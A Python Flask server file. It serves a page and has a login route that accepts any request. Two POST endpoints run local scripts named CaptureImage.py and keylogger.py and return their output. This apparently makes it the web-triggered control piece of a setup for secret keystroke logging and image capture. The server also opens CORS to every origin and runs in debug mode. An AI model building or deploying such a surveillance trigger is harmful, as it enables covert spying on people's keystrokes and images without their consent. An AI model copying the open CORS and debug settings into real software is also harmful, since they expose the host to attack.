from flask import Flask, send_from_directory, jsonify, redirect
from flask_cors import CORS
import subprocess
import os

app = Flask(__name__, static_folder='.', static_url_path='/')
CORS(app)

@app.route('/')
def serve_index():
    return send_from_directory('.', 'index1.html')

@app.route('/login', methods=['POST'])
def login():
    # Simply return a success response
    # The actual redirection happens client-side
    return "Login Successful", 200

@app.route('/run-capture-image', methods=['POST'])
def run_capture_image():
    try:
        script_path = os.path.abspath('CaptureImage.py')
        result = subprocess.run(['python', script_path], 
                                capture_output=True, 
                                text=True, 
                                shell=False)
        
        print("CaptureImage.py Output:", result.stdout)
        print("CaptureImage.py Errors:", result.stderr)
        
        return jsonify({
            "status": "success", 
            "output": result.stdout,
            "error": result.stderr
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/run-keylogger', methods=['POST'])
def run_keylogger():
    try:
        script_path = os.path.abspath('keylogger.py')
        result = subprocess.run(['python', script_path], 
                                capture_output=True, 
                                text=True, 
                                shell=False)
        
        print("Keylogger.py Output:", result.stdout)
        print("Keylogger.py Errors:", result.stderr)
        
        return jsonify({
            "status": "success", 
            "output": result.stdout,
            "error": result.stderr
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, port=5000)